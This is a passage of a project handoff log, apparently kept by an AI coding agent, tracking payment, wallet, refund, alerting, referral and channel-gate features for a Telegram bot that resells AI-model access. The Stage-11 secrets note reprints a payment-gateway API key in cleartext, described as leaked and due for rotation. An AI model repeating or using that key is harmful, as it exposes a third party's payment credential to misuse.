| **Stage-10-Step-A** | **Per-currency NowPayments minimum + $2 global floor + pre-flight refusal with alternative-coin suggestion.** Lowered the existing $5 hard floor to $2 (`payments.GLOBAL_MIN_TOPUP_USD`, env-overridable via `MIN_TOPUP_USD`). Before we POST `/v1/payment`, proactively look up the per-currency minimum via `/v1/min-amount` (the existing `get_min_amount_usd` cache) and refuse below `max(GLOBAL_MIN_TOPUP_USD, per_currency_min)` with a message that names the min AND suggests the cheapest alternative currency that WOULD cover the user's requested amount (`find_cheaper_alternative`). Background task `refresh_min_amounts_loop(tickers, interval=15min)` warms the cache on boot and refreshes so the pre-flight check is cache-hit-fast. 3 new string keys (fa/en): `charge_min_amount_with_min_and_alt` alongside the existing `_with_min` / `_unknown` fallbacks. Shipped PR #92 + fast-follow correctness fix PR #93 (refresh preserves prior cached value during NowPayments API outages — without this, `effective_min_usd` silently collapsed to the $2 floor mid-outage and the pre-flight falsely admitted sub-min invoices). | P1 correctness | ✅ shipped (#92, #93) |
| **Stage-10-Step-B** | **Transparent markup-inclusive pricing in model picker.** User feedback 2026-04-29: "right now in selecting models of chat it shows the price of same as the site. but we want som profits dont we." Today the picker renders raw OpenRouter per-1M-token prices (see `handlers.models_provider_page` → `models_price_format`); actual cost-per-message is `raw * COST_MARKUP` (see `pricing._apply_markup`, default 1.5x via `COST_MARKUP` env). Shipped the fix: new `pricing.apply_markup_to_price(ModelPrice) → ModelPrice` is the single source of truth for the *display* side, reusing the same defensive fallback (`FALLBACK_PRICE` when NaN / infinite / negative, so the picker never renders `$nan/1M`). `handlers.models_provider_page` now passes `model.price` through `apply_markup_to_price` before formatting — the per-1M number shown on each row is exactly the rate billed per 1M tokens. Added a locale-aware footnote to `models_provider_title` (fa + en) so users see "prices include service fee" — no hidden markup. Free-tier models ($0/M) stay $0 because `0 * markup == 0`. **Bundled clean-up**: display-side and billing-side were both ad-hoc; they now funnel through the same fallback branch, so a future refactor that drops the billing guard wouldn't desync the picker from the wallet debit. 5 new tests in `tests/test_pricing.py` (887 total, was 882): default-markup math, env-override math, free-model preservation, NaN fallback, and a "display-matches-charge" invariant that pins the picker-per-1M to `_apply_markup`'s 1M-token cost for the same raw price so a future markup refactor can't silently resurface the dishonesty. | P2 product | ✅ shipped (#94) |
| **Stage-10-Step-C** | **Auto-discover new OpenRouter models + admin DM.** Shipped: `model_discovery.py` + `alembic/versions/0008_seen_models.py` + `database.db.get_seen_model_ids` / `record_seen_models`. Forever-loop `discover_new_models_loop(bot)` (interval `DISCOVERY_INTERVAL_SECONDS`, default 6h) pulls the live catalog via `models_catalog.force_refresh()` (Step-D swapped the TTL-respecting `get_catalog()` for an explicit force refresh so price-delta alerts fire on the loop cadence, not the 24h TTL), diffs against the persistent `seen_models` watermark, records the newly-seen ids via `ON CONFLICT DO NOTHING` and DMs every `ADMIN_USER_IDS` a plain-text summary. Per-provider allowlist (env `ADMIN_NOTIFY_DISCOVERY_PROVIDERS`, default: `openai,anthropic,google,x-ai,deepseek` — the same five the picker surfaces as top-level buttons; set `*` for firehose). **Bootstrap behaviour:** on first-run (empty `seen_models` table) we silently record every current catalog id without DMing anyone — otherwise a fresh deploy would spam admins with 200+ "new model" messages. **Per-admin fault isolation:** `TelegramForbiddenError` (admin blocked the bot) logs at INFO and keeps going; `TelegramAPIError` (transient 5xx) logs and keeps going. **Overflow handling:** hard-capped at `DISCOVERY_MAX_MODELS_PER_DM` (default 10) so a big family drop doesn't bust Telegram's 4 096-char limit; the overflow count is appended to the DM footer. `main.py` spawns + cancels the loop on shutdown alongside the min-amount refresher and pending-expiration reaper. 19 new tests in `tests/test_model_discovery.py` (906 total, was 887). **Bundled improvement:** added public accessor `admin.get_admin_user_ids()` so outside modules no longer poke the private `_ADMIN_USER_IDS` (which was reachable via a convention that a future refactor could silently break). Shipped PR #95. A web-panel "approve new models" toggle is deferred to a future PR — the immediate ask was admin notification, and a DM is the simplest channel that works today without new auth surface. | P2 product | ✅ shipped (#95) |
| **Stage-10-Step-D** | **Auto-refresh catalog prices + admin DM on >20% deltas.** Shipped: `alembic/versions/0009_model_prices.py` + `database.db.get_model_prices` / `upsert_model_prices` (single `INSERT … ON CONFLICT DO UPDATE` so a 200-model catalog is one round-trip) + `models_catalog.force_refresh()` (new TTL-bypassing accessor). Extended `model_discovery.run_discovery_pass` to (1) force-refresh the live catalog on every pass — price alerts now fire on the 6h discovery cadence, not the 24h catalog TTL; (2) diff per-side prices against the persistent `model_prices` snapshot; (3) DM every admin when any model moved by more than `PRICE_ALERT_THRESHOLD_PERCENT` (default 20%) on either side, with the biggest absolute swing at the top of the DM and both sides' pct delta shown with ↑/↓ arrows; (4) always upsert the current snapshot — including on bootstrap — so the NEXT pass has a baseline to diff (skipping this would postpone price alerts by one 6h interval on a fresh deploy for no good reason). New-model DMs (Step-C) and price-delta DMs are independent channels, each capped at `DISCOVERY_MAX_MODELS_PER_DM` with overflow footers. **Bundled bug fix:** `models_catalog._refresh_if_stale` used to log `"OpenRouter /models fetch failed; using static fallback"` for BOTH the cold-cache fallback AND the stale-but-keep-serving branch — the second case kept the live catalog but still told the operator we had downgraded to the static table. Split into two distinct log messages (`exception` on the actual fallback, `warning` with `exc_info=True` on the keep-serving branch) so an operator tailing logs during an OpenRouter outage can tell what actually happened. 13 new tests in `tests/test_model_discovery.py` (919 total, was 906): delta detection above / below threshold, new-model vs. existing-model separation, zero-prior-side ZeroDivisionError guard, output-side-only moves, price cuts (negative deltas), sort order, formatter rendering + overflow, admin-fanout fault isolation, end-to-end two-DM pass, SQL shape (`ON CONFLICT DO UPDATE`, `model_prices` table name), empty-input short-circuit. A "last price refresh" timestamp in the admin panel is deferred to a future PR — the immediate ask was "alert me when prices change", a DM delivers that; surfacing `last_seen_at` in the admin UI is a separate UX add. | P3 operational | ⏳ this PR |

### Stage-11 — Dollar-backed wallet + Toman display + TetraPay Rial gateway

User feedback 2026-04-29: *"i want a live dolor to toman tracker that tell people how many tomans they have in their wallet. and i want to add an toman payment method called تترا پی. give people their toman corency and give me dolors … we keep peoples wallet in dolors to not change their value by time."*

**Architectural invariant (locked):** the wallet balance stays denominated in **USD**. Toman is a *display / input* currency only. A user who top-ups 400 000 ﷼ sees $2.00 added to balance; that $2 never changes when the exchange rate moves. The Toman number next to it updates live, so the user's purchasing power tracks the market — exactly what was asked.

**Secrets hygiene note.** The TetraPay API key was pasted in cleartext in the user chat (`4eb72bf869b9c3128ee7562dbbde7999`). Treat as burned; the operator was told to rotate it in the TetraPay dashboard before Stage-11-Step-C ships. The key lives in `TETRAPAY_API_KEY` env var, NOT in the repo.

| # | Title | Priority | Status |
| --- | --- | --- | --- |
| **Stage-11-Step-A** | **Live USD→Toman exchange rate ticker.** Shipped in PR #97: `fx_rates.py` + `alembic/versions/0010_fx_rates_snapshot.py` + `database.db.get_fx_snapshot` / `upsert_fx_snapshot`. Background `refresh_usd_to_toman_loop` (default 10-min cadence, env `FX_REFRESH_INTERVAL_SECONDS`) pulls from a configurable source (default `nobitex.ir` USDT/IRR — free, no auth; normalised to tomans by ÷10). In-memory `FxRateSnapshot` cache + single-row DB snapshot so a process restart starts with the last known-good rate rather than a cold cache (~10 min of no-rate would otherwise break the Stage-11-Step-D wallet UI and Stage-11-Step-B Toman top-up). Cache-preservation pattern matches `payments.refresh_min_amounts_once`: on fetch failure keep the prior cached value rather than collapsing. Plausibility band `[10 000, 1 000 000]` tomans per USD guards against upstream returning 0/NaN/absurd values. Admin DM via `bot.send_message` on moves ≥ `FX_RATE_ALERT_THRESHOLD_PERCENT` (default 10%, env-overridable) with per-admin fault isolation. Source is pluggable (`FX_RATE_SOURCE=nobitex|bonbast|custom_json_path|custom_static`). `main.py` spawns + cancels the refresher alongside the other background tasks. 34 new tests in `tests/test_fx_rates.py`. | P1 foundational | ✅ shipped |
| **Stage-11-Step-B** | **Dual-currency top-up entry UI.** Added alongside the existing $5/$10/$25/Custom(USD) buttons a new "Custom (Toman)" button (`btn_amt_toman` / `amt_toman` callback). Tapping it shows a fa-localised prompt that renders the current rate (from `fx_rates.get_usd_to_toman_snapshot`) and the $2-equivalent in tomans. The user enters an amount like `400,000` or `۴۰۰٬۰۰۰ تومان`; new `amount_input.normalize_amount` handles Persian / Arabic-Indic digits, thousand separators (ASCII comma, Arabic comma `،`, Arabic thousands `٬`, NBSP, bidi marks), trailing currency markers (`تومان`, `toman`, `TMN`, `$`, `USD`), and EU-vs-US decimal heuristics. Conversion stashes the USD figure in FSM `custom_amount` — the rest of the invoice pipeline is unchanged. Entry-time rate captured in FSM (`toman_rate_at_entry`) so Step-C can lock it per-invoice. Below-$2-equivalent entries get the Toman-specific refusal showing both the min and what the user typed. Cold-cache state (fx refresher hasn't populated yet) refuses with `charge_toman_no_rate` rather than dead-end the FSM. USD path now uses the same parser, so fa-digits work there too. Stage-11-Step-D follow-up consolidated the snapshot read into a single `get_usd_to_toman_snapshot` call inside `process_toman_amount_input` (was: `convert_toman_to_usd` + a separate snapshot read), eliminating a race where the cache could rotate between the two awaits and leave the displayed rate inconsistent with the computed USD. | P1 product | ✅ shipped |
| **Stage-11-Step-C** | **TetraPay (Rial card) gateway.** Shipped: new module `tetrapay.py` with `create_order` (POSTs `{ApiKey, Hash_id, Amount, Description, Email, Mobile, CallbackURL}` to `https://tetra98.com/api/create_order`, expects `status="100"` + `payment_url_web` + `Authority` + `tracking_id`) and `verify_payment` (POSTs `{ApiKey, Authority}` to `/api/verify`, expects `status="100"`). Webhook handler `tetrapay_webhook` mounted on `/tetrapay-webhook` (registered in `main.start_webhook_server`). The webhook flow is: parse JSON → require `authority` → replay-dedupe via `payment_status_transitions(authority, status)` (reusing the Stage-9-Step-4 dedupe table — same constraint that protects NowPayments) → drop with 200 if non-"100" status (user cancelled / declined; reaper sweeps the PENDING row after 24h) → look up the locked USD figure on our PENDING row via the new `Database.get_pending_invoice_amount_usd` helper → call `verify_payment` (the AUTHORITATIVE settlement check; user-side callback alone is not trusted) → call `Database.finalize_payment(authority, locked_usd)` (idempotent, atomic) → best-effort Telegram notification. Credit amount is the USD equivalent **locked at order-creation time** (stored on the PENDING row's `amount_usd_credited`), NOT recomputed at settlement — Iranian banks regularly take multiple minutes for Shaparak 3DS round-trips and the rial can move meaningfully in that window; recomputing would rob the user. The locked rate is also recorded on a new `transactions.gateway_locked_rate_toman_per_usd DECIMAL(20, 4) NULL` column (alembic `0011_tetrapay_locked_rate.py`) for forensic audit; NULL for crypto rows (NowPayments quotes the conversion on its own side). Per-process drop counters (`bad_json` / `missing_authority` / `non_success_callback` / `unknown_invoice` / `verify_failed` / `replay`) mirror the NowPayments `_IPN_DROP_COUNTERS` so a misconfigured TetraPay merchant panel pointing at the prod webhook is visible without grep-fu. Hash_id generation uses `secrets.token_hex(12)` (96 bits of entropy). UI: a new "💳 پرداخت با کارت ایرانی" / "💳 Pay with Iranian card" button is surfaced on the **Toman entry path only** (`process_toman_amount_input` keyboard) — the USD entry path deliberately does NOT show it because there's no entry-side rate lock to capture. Tapping it routes through `_start_tetrapay_invoice` which reads the `toman_rate_at_entry` from FSM, calls `tetrapay.create_order`, persists PENDING with the locked rate, and renders the redirect URL on a "Go to gateway" inline button. Strings: `tetrapay_button` / `tetrapay_creating_order` / `tetrapay_order_text` / `tetrapay_pay_button` / `tetrapay_unreachable` / `tetrapay_credit_notification` (fa + en). `.env.example` documents `TETRAPAY_API_KEY`, `TETRAPAY_API_BASE` (override of `https://tetra98.com`), `TETRAPAY_REQUEST_TIMEOUT_SECONDS`. **Bundled bug fix:** `Database.create_pending_transaction` previously had NO finite-amount guard — every other money-write site (`deduct_balance`, `redeem_gift_code`, `log_usage`, `admin_adjust_balance`) and every settle site (`finalize_payment`, `finalize_partial_payment`) refuses NaN / ±Inf, but the *create* site relied on its callers being well-behaved. PostgreSQL's NUMERIC accepts `'NaN'::numeric` without complaint and there's no CHECK constraint, so a buggy / future caller passing `float('nan')` would happily INSERT a poisoned PENDING row that `finalize_payment`'s NaN guard then refuses to credit — leaving the invoice eternally PENDING until the reaper sweeps it ~24h later, but with the user already having paid the gateway. Step-C completes the defense by refusing non-finite or non-positive `amount_usd` / `amount_crypto`, non-finite or negative `promo_bonus_usd`, and non-finite or non-positive `gateway_locked_rate_toman_per_usd` *before* the INSERT. 38 new tests in `tests/test_tetrapay.py` covering: `usd_to_irr_amount` rounding (4 cases) + non-finite refusal (3 cases); `create_order` happy-path POST shape, missing API key, missing `WEBHOOK_BASE_URL`, non-100 gateway status, non-JSON response, missing `Authority`, random Hash_id generation; `verify_payment` happy path, non-100 status, empty authority, missing API key; `tetrapay_webhook` happy path (verify + finalize + Telegram notify), bad JSON, non-object JSON, missing authority, replay drop, non-success callback drop, unknown-invoice drop, verify-failure drop, capitalisation tolerance (`Authority` / `Hash_id`), finalize-returns-None race, Telegram-notify failure does not 500; `create_pending_transaction` defensive guards (NaN amount_usd / Inf amount_usd / zero amount_usd / NaN amount_crypto / negative promo_bonus / NaN locked rate / zero promo accepted / NULL locked rate accepted / locked rate persisted to SQL). 1004 → 1042 passing. | P1 correctness | ✅ shipped |
| **Stage-11-Step-D** | **Wallet display shows USD balance + live Toman equivalent.** Shipped in this PR (Devin session [a9d48c8b](https://app.devin.ai/sessions/a9d48c8bed6240138e62b911a20184bf)): new module `wallet_display.py` (`format_toman_annotation`, `format_balance_block`) and a new `{toman_line}` placeholder on `wallet_text`. Every wallet surface (`hub_wallet_handler`, `back_to_wallet_handler`) reads the cached `FxRateSnapshot` once at render time and splices `≈ N تومان` (fa) / `≈ N TMN` (en) onto the `$X.YZ` line. When `snap.is_stale()` (default 4× refresh interval, ~40 min at 10-min cadence) we suffix the line with the `(نرخ تقریبی)` / `(approx)` marker. Cold cache (no rate ever observed) silently drops the Toman line — the wallet still renders, just without the annotation. Defense-in-depth: NaN / ±Inf balances and arithmetic-overflow products are rejected with an empty annotation, never `≈ nan تومان`. Two new strings: `wallet_toman_line`, `wallet_toman_line_stale`. **Bundled bug fix:** `process_toman_amount_input` now reads `get_usd_to_toman_snapshot` exactly once (the prior pair `convert_toman_to_usd` + separate snapshot read could observe two cache rotations and leave the displayed rate inconsistent with the computed USD); see Stage-11-Step-B row above. 17 new tests in `tests/test_wallet_display.py` (1021 total, was 1004). | P2 product | ✅ shipped |

Dependency order: Step-A unblocks all downstream work (the ticker feeds B, C's credit math, and D's display). Step-B unblocks C (we need the USD-side amount in hand before we can send anything to TetraPay). Step-D depends only on Step-A and ships standalone.

Deferred / out-of-scope for Stage-11: (a) a cash-out flow (users withdrawing back to IRR), (b) multi-currency wallet denominations (user choosing to hold balance in Toman instead of USD — the user explicitly rejected this, wallet MUST stay USD-denominated), (c) USDT-on-TRC20 as an alternative Rial proxy.

### Stage-12 queue — post-Stage-11 (queued 2026-04-29 after PR #100 merged)

User direction (2026-04-29): *"prioritize all of them first and note them in handoff first and then do them one by one."* This is the prioritized list. Each step is one PR with a real bundled bug fix (never invented), HANDOFF.md + README.md updated per §11. Order is per the §3 framework — money/correctness first, then ops visibility, then product surface.

| # | Title | Priority | Status |
| --- | --- | --- | --- |
| **Stage-12-Step-A** | **Refunds / chargebacks admin UI** (shipped — see PR description). `/admin/transactions/{id}/refund` (POST, CSRF, audit-logged) backed by `Database.refund_transaction(transaction_id, reason, admin_telegram_id)`. SELECT … FOR UPDATE on transactions row + users row, refuses if `status != "SUCCESS"`, gateway is `admin` / `gift`, or balance < refund amount (admin gets a "user spent it; debit manually first" banner); on success debits the wallet by `amount_usd_credited`, flips status to `REFUNDED`, writes `refunded_at` + `refund_reason` columns (alembic 0012), and the route records a `refund_issued` audit row (or `refund_refused` on rejection). Bookkeeping-only refund — operator settles the user off-platform separately. **Bug fix bundled:** `mark_transaction_terminal` previously accepted `"REFUNDED"` and silently flipped a row to REFUNDED without debiting the wallet — a money-mint hazard for any future caller picking the wrong helper. Split: `TERMINAL_FAILURE_STATUSES` is now `{"EXPIRED", "FAILED"}`, `REFUND_STATUSES` is `{"REFUNDED"}`, and the IPN-side `refunded` path routes through a dedicated `mark_payment_refunded_via_ipn` helper that mirrors the previous no-debit semantics on PENDING / PARTIAL rows. **Follow-up (also shipped):** the form-side `REFUND_REASON_MAX_CHARS` cap was hard-coded to 500 (the DB cap) — but the route prepends a 6-char `[web] ` prefix before sending the reason to the DB, so a 500-char operator reason slipped past form validation, got prefixed to 506 chars, and tripped the DB-side `ValueError` (caught, but only after rendering a confusing banner). The follow-up makes `REFUND_REASON_MAX_CHARS = Database.REFUND_REASON_MAX_LEN - len("[web] ")` so the prefixed value always fits. | P0 correctness | ✅ shipped |
| **Stage-12-Step-B** | **Stuck-payment proactive admin DM.** Stage-9-Step-9 surfaces "Pending payments: N (oldest: Xh ago)" on the dashboard, but an admin who isn't actively looking at the dashboard has no way to know an invoice is stuck — IPN delivery delay, gateway flap, or webhook misconfiguration can pile up `PENDING` rows for hours before anyone notices. **Shipped:** new module `pending_alert.py` with `start_pending_alert_task(bot)` (cadence `PENDING_ALERT_INTERVAL_MIN`, default 30 min) that DMs every `ADMIN_USER_IDS` when *any* `PENDING` row's age exceeds `PENDING_ALERT_THRESHOLD_HOURS` (default 2). Per-row alert key = `(transaction_id, floor(age_hours))` so the same stuck row doesn't spam the same alert every 30 min — once per hour-bucket per transaction. Per-admin fault isolation mirrors Stage-10-Step-D: `TelegramForbiddenError` per admin is logged INFO and skipped; `TelegramAPIError` is logged and skipped; loop never crashes. Bootstrap dedupe state is in-memory, so a restart can re-alert once on already-stuck rows — intentional. New DB method `Database.list_pending_payments_over_threshold(threshold_hours, limit)` returns oldest-first, server-computed `age_hours` (Postgres clock is authoritative across replicas). DM body: "⚠️ N pending payment(s) stuck over Xh:" + bullet list (capped at 10 rows + overflow footer). Wired into `main.py` lifecycle (spawn + cancel + await). New env vars in `.env.example`: `PENDING_ALERT_INTERVAL_MIN`, `PENDING_ALERT_THRESHOLD_HOURS`, `PENDING_ALERT_LIMIT`. **Bug-fix shipped:** `Database.get_system_metrics()` now accepts `pending_alert_threshold_hours` and exposes `pending_payments_over_threshold_count` + `pending_alert_threshold_hours` on its return dict. The dashboard handler reads the threshold via `pending_alert.get_pending_alert_threshold_hours()` so the "Pending payments" tile (now showing "oldest Xh • N over Yh") and the alert DM body reference the *same* row set, eliminating the drift between `MIN(created_at)` (the old tile) and the actual alert criterion. 24 new tests in `tests/test_pending_alert.py`; all 1124 tests green. | P1 ops | ✅ shipped |
| **Stage-12-Step-C** | **User-side TetraPay receipts in `/wallet`.** A TetraPay user previously had no in-bot way to look up "what did I top up last week, with which card?" — the data lived in `transactions` but was only exposed via the admin panel. **Shipped:** new "🧾 Recent top-ups" button on the wallet keyboard, paginated through the user's last N (default 5, `RECEIPTS_PAGE_SIZE` env var, capped at 20) SUCCESS / PARTIAL / REFUNDED transactions. Per row: USD-credited figure, status badge (✅ SUCCESS, ⚠️ PARTIAL, 🔄 REFUNDED), gateway-friendly label (NowPayments shows the crypto token e.g. `USDT-TRC20`, TetraPay shows `TetraPay (≈ N TMN)` using the `gateway_locked_rate_toman_per_usd` captured at order-creation, `admin` → `Manual credit`, `gift` → `Gift code`), and the most-relevant date (`completed_at` for SUCCESS / PARTIAL, `refunded_at` for REFUNDED, falling back to `created_at` for legacy null rows). Cursor pagination via `before_id` over `transaction_id` so a fresh top-up landing while the user browses doesn't shift pages or surface duplicates. **Bug fix shipped:** new `Database.list_user_transactions(*, telegram_id, limit, before_id=None)` that **hard-codes the `WHERE telegram_id = …` filter** and `raise ValueError` on an unset / zero / negative `telegram_id`. The admin-side `list_transactions` takes `telegram_id` as just one of many *optional* filters — fine on the admin side where the panel auth catches a missing filter, but exposing the same shape on the user side would let a future buggy caller drop the user-scope clause and leak someone else's history. The new method makes that bug structurally impossible. New rendering module `wallet_receipts.py` (`format_receipt_line`, `format_receipts_page`, `get_receipts_page_size`) with the same NaN-defense policy as `wallet_display`: a non-finite `amount_usd` renders `$0.00`, never `$nan`; a non-finite locked rate omits the Toman annotation rather than rendering `≈ nan TMN`. New env var `RECEIPTS_PAGE_SIZE` (default 5, max 20). 29 new tests in `tests/test_wallet_receipts.py` (1153 total, was 1124). | P2 product | ✅ shipped |
| **Stage-12-Step-D** | **Gift-code redemption stats web page.** `/admin/gifts` previously listed codes and their `used_count` cell, but there was no per-code drill-down — to see who redeemed a code an admin had to query the DB directly. **Shipped:** new `/admin/gifts/{code}/redemptions` page lists every `gift_redemptions` row for a code (newest first) with `telegram_id` (linked back to `/admin/users/{id}`), `username`, `redeemed_at`, `transaction_id`, and the per-redemption USD figure. The USD figure is joined from `transactions.amount_usd_credited`, NOT `gift_codes.amount_usd` — a code can be re-priced between redemptions, and the receipt should reflect what the user actually got, not what the code is set to today. Aggregates above the table: redemption count, total credited (sum of `amount_usd_credited`), first / last `redeemed_at`. Per-page layout mirrors Stage-9-Step-8's `/admin/users/{id}/usage` browser (paginated, per-page picker default 50 / max 200, prev/next). Linked from the existing gifts list — the `used_count` cell becomes a drilldown link when > 0. Tampered URL codes (chars outside `[A-Za-z0-9_-]`, length > 64) and unknown codes redirect back to `/admin/gifts` with a flash banner instead of 404'ing or hitting the DB; orphaned redemption rows (NULL `transaction_id` from the `ON DELETE SET NULL` schema) render `—` for the credited / tx columns instead of leaking `None`. **Bug-fix shipped:** the HANDOFF "bug-fix candidate" was real. `gift_redemptions` was created in alembic 0003 with two access paths indexed (PK `(code, telegram_id)` and `idx_gift_redemptions_user` on `(telegram_id, redeemed_at DESC)` for per-user history) but **no index for `WHERE code = ? ORDER BY redeemed_at DESC`** — the new drilldown's canonical access pattern. The PK can satisfy the WHERE but its sort order is by `telegram_id`, so the query falls back to a per-code partition scan + in-memory sort. New alembic 0013 adds `idx_gift_redemptions_code_redeemed_at` on `(code, redeemed_at DESC)` so the new page is a forward index scan in display order. New `Database.list_gift_code_redemptions(*, code, page, per_page)` (per_page clamped to `[1, GIFT_REDEMPTIONS_MAX_PER_PAGE=200]`, code uppercased before the WHERE — the table stores uppercase) and `Database.get_gift_code_redemption_aggregates(code)` (`COALESCE(SUM(amount_usd_credited), 0)` so an all-orphan code surfaces 0 not NULL); plus `Database.get_gift_code(code)` for the per-page header. 23 new tests in `tests/test_web_admin.py` + `tests/test_database_queries.py`; 1176 tests green (was 1153). | P3 product | ✅ shipped |

Dependency order: A is independent and gates the others (refunds is a P0 because a user dispute today has no in-product path). B can ship anytime after A (independent). C and D are independent leaves.

Deferred / explicitly out of Stage-12 scope: (a) the live TetraPay `/api/refund` call (gateway-side automated refund — Step-A.5 follow-up if user asks); (b) multi-step approval workflows on refunds (single admin's signature is fine for the bot's current scale); (c) user-initiated refund requests from the bot side (would require a dispute UX + admin queue — much larger scope).

### Stage-13 queue — post-Stage-12 (queued 2026-04-30 after PR #106 merged)

User direction (2026-04-30): *"specify our steps forward and at last make something for me that when my users start the bot it asks them for join the channel."* Per §3 priority framework — product surface first this round (the user explicitly asked for the channel gate), then operational hardening.

| # | Title | Priority | Status |
| --- | --- | --- | --- |
| **Stage-13-Step-A** ✅ merged (PR #107) | **Required-channel subscription gate.** New `force_join.py` module with `RequiredChannelMiddleware` (registered after `UserUpsertMiddleware` so the users row is available to render localised text) + the `force_join_check` callback handler. When `REQUIRED_CHANNEL` env var is set (public `@handle` or numeric `-100…` chat id), every non-admin user must be a member of the channel before *any* handler — including `/start` — runs; non-members get a "Please join @channel" screen with a Join button (URL-deep-linked to `https://t.me/<handle>` for public channels, or `REQUIRED_CHANNEL_INVITE_LINK` for private channels) + an "✅ I've joined" callback that re-checks membership via `bot.get_chat_member` and drops the user at the hub on success. Admins (`ADMIN_USER_IDS`) bypass the gate so the operator can never lock themselves out. **Fail-open semantics:** on a `TelegramBadRequest` ("chat not found", "user not found", bot not yet admin of the channel) or any other `TelegramAPIError`, the gate logs a WARNING and lets the user through — failing closed would brick every user during the bootstrap window when the operator hasn't promoted the bot to channel admin yet. New strings (`force_join_text`, `force_join_not_yet`, `btn_force_join_join`, `btn_force_join_check`) ship in fa + en and are editable via `/admin/strings` like every other user-facing label. New env vars `REQUIRED_CHANNEL` + `REQUIRED_CHANNEL_INVITE_LINK` documented in `.env.example`; both default to empty so existing deploys see no behaviour change. **Bug fix bundled:** `_hub_text_and_kb` directly formats `${balance:.2f}` from `float(user["balance_usd"])` — same regression PR #101 fixed for `wallet_text` via `format_balance_block`. The hub template was missed; a corrupted `users.balance_usd` row (legacy NaN, manual SQL fix gone wrong) would leak literally `$nan` into the user's hub view. Now NaN-guarded with `math.isfinite` → `$0.00` fallback (the closest sensible rendering of "we don't know your balance" — the upstream that handed us a NaN has a real bug, not a UI string). 36 new tests in `tests/test_force_join.py` (1212 total, was 1176): env-string parser branches, `ChatMember.status` predicate matrix, fail-open path, admin bypass, non-member rendering, callback-loop escape hatch, hub_title NaN/Inf regression pins. | P2 product | ✅ this PR |
| **Stage-13-Step-B** ✅ merged (PR #108) | **Per-message in-flight cap on the AI chat path.** New `try_claim_chat_slot(user_id)` / `release_chat_slot(user_id)` primitives in `rate_limit.py` enforce ≤1 in-flight OpenRouter request per user. The existing `consume_chat_token` token bucket gates *throughput* (sustained spend) but its default 5-token capacity lets a burst of 5 prompts hit OpenRouter in parallel before the bucket reacts — on a paid model that drains $5+ from the wallet in under a second, far above what the user actually intended. The new slot is the second layer: a second prompt arriving while the first is still in flight is rejected with the new `ai_chat_busy` flash ("Your previous message is still being processed. Please wait…") so the user gets clear feedback instead of silent loss + a delayed cost they can't predict. Slot is released in a `try…finally` so an OpenRouter exception, a `TelegramAPIError` on `send_chat_action`, or any other unexpected raise can't permanently lock the user out. Set is bounded at 10 000 entries with FIFO eviction as defence against a slow leak from a forgotten release. **Bug fix bundled:** OpenRouter's chat-completion spec lets `content` be `null` (tool-call shape; upstream policy refusals at the OpenRouter aggregator layer sometimes surface as 200s with `content: null` rather than the explicit `{"error": ...}` body the existing guard catches). Pre-fix, `chat_with_model` would forward the literal `None` to `process_chat`, which then handed it to Telegram and got back `Bad Request: message text is empty` — bubbling up as a poller-level crash for that user with no actionable message back. Now both `ai_engine.chat_with_model` (source) and `process_chat` (defence in depth) treat empty/null reply text as the same `ai_provider_unavailable` path the explicit-error branch already renders. 20 new tests in `tests/test_chat_inflight.py` (1232 total, was 1212): slot primitives (claim/release/idempotent/concurrency), `process_chat` wiring (success path releases, exception path releases, busy flash, gate ordering, per-user isolation), bundled bug-fix regression pins (None / empty-string / null-content), and i18n existence checks for `ai_chat_busy` in fa + en. | P0 cost-correctness | ✅ this PR |
| **Stage-13-Step-Aplus** ✅ merged (PR #109) | **Complete the Stage-13-Step-A NaN guard rollout.** Step-A's bundled fix added a `math.isfinite` guard to `_hub_text_and_kb` before formatting `${balance:.2f}` and the comment on that fix asserted *"PR #101 already shipped this exact guard for `wallet_text` via `format_balance_block`"* — but `format_balance_block` was actually never wired into the wallet handlers. `hub_wallet_handler` and `back_to_wallet_handler` both still call `t(lang, "wallet_text", balance=float(user_data["balance_usd"]), …)` directly, and the `redeem_ok` branch of `_redeem_code_for_user` does the same with `new_balance_usd`. So a corrupted `users.balance_usd` row would still leak `$nan` to the wallet view + the redeem-confirmation message — exactly the regression Step-A claimed to have closed everywhere. This PR finishes the job: identical inline `math.isfinite(…) → 0.0` guard at all three call sites, plus the misleading comment in `_hub_text_and_kb` updated to reflect what the codebase actually does. 7 new regression pins in `tests/test_wallet_text_nan_guard.py` (1239 total on top of #108 main, was 1232): NaN / +Inf / −Inf at both wallet handlers + `redeem_ok`, plus finite-balance pass-through pins so the guard is never broadened into a blanket override. | P2 correctness (UI defensive) | ✅ this PR |
| **Stage-13-Step-C** (this PR) | **Referral codes** — user-to-user invite codes that credit both wallets on the invitee's first paid top-up. New `referral_codes` + `referral_grants` tables (alembic `0014_referral_codes`), new `referral.py` module that owns env-var config (`BOT_USERNAME` / `REFERRAL_BONUS_PERCENT` / `REFERRAL_BONUS_MAX_USD`) + the `/start <payload>` parser. Wallet keyboard gets a `🎁 Invite a friend` button routing to a new `hub_invite_handler` that renders the user's code, share deep-link (or copy-paste-only fallback if `BOT_USERNAME` is unset), and lifetime stats (pending / paid / total bonus earned). The invitee deep-link (`/start ref_<code>`) lands on a new `cmd_start` branch that calls `db.claim_referral` to insert a PENDING grant row — with localised flash messages for `unknown` / `self` / `already_claimed`. The bonus credit fires inside the `finalize_payment` / `finalize_partial_payment` open transaction the moment the invitee crosses their first paid USD credit (PARTIAL or SUCCESS, whichever fires first); both referrer and invitee wallets get `min(amount * percent, max_usd)` (default 10% capped at $5). The flip is idempotent against IPN replays via `SELECT ... FOR UPDATE` on the grant row + a `status='PAID'` write that's only valid against a `'PENDING'` row. **Bundled bug fix:** `cmd_start` previously ignored `message.text` past the slash command itself; the audit findings (HANDOFF §5) had this pencilled in as the bundled bug, and this PR closes it — referral deep-links would have arrived but never wired the invitee to a referrer. **Defence in depth:** `compute_referral_bonus` rejects NaN / Inf / non-positive amounts and percents and caps; `_grant_referral_in_tx` short-circuits before the lock if the amount is bad; the `referral_grants.invitee_telegram_id` UNIQUE constraint prevents an invitee from being claimed by two different referrers; the `referral_grants` CHECK constraint prevents self-referral at the DB layer too. New tests in `tests/test_referral.py` (1305 total, was 1239 baseline): payload parser branches, env-var config fallbacks, share-URL builder, bonus computation matrix, `_grant_referral_in_tx` SQL flow with a fake connection, `hub_invite_handler` link / no-link rendering, `cmd_start` referral wiring (happy path + unknown / self / claim-failure resilience), wallet-keyboard pin. | P2 product | ✅ this PR |
